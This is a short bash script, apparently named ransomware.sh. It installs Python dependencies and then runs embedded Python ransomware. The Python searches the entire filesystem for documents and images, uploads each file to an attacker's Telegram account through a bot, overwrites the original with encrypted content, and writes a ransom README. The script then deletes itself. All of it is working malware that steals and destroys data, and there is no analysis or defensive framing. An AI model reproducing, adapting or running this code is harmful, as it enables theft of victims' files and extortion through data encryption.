#!/bin/bash

apt-get install python3 -y
apt install python3-pip -y
pip install cryptography
pip install telepot


PY_SH=$(cat <<EOF
#!/usr/bin/python3
# -*- coding: utf-8 -*-

import glob
import os
import sys
import telepot
from cryptography.fernet import Fernet
from pathlib import Path

print("starting...\n")
TOKEN = "telegram_bot_token"
ATTACKER = telegram_attacker_id
key = Fernet.generate_key()
print("key: " + str(key))
KEY = Fernet(key)

bot = telepot.Bot(TOKEN)

extensions_list = ["pdf", "docx", "xlsx", "png", "jpg", "jpeg"]

def notify(file_path):
	try:
		bot.sendDocument(ATTACKER, open(file_path, "rb"))
		with open(file_path, "rb") as file:
			original = file.read()
		encrypted = KEY.encrypt(original)
		with open(file_path, "wb") as encrypted_file:
			encrypted_file.write(encrypted)
		print(file_path)
	except:
		pass

print("copying and encrypting\n")
for extension in extensions_list:
	for file_path in Path("/").rglob("*."+extension):
		notify(file_path)
		
with open("README.topsecretcrypter","w+") as readme:
	readme.write("WRITE HERE THE MESSAGE YOU WANT TO APPEAR IN THE README FILE THAT WILL BE GENERATED AFTER ENCRIPTION")


EOF
)
python3 -c "$PY_SH"

rm -f ransomware.sh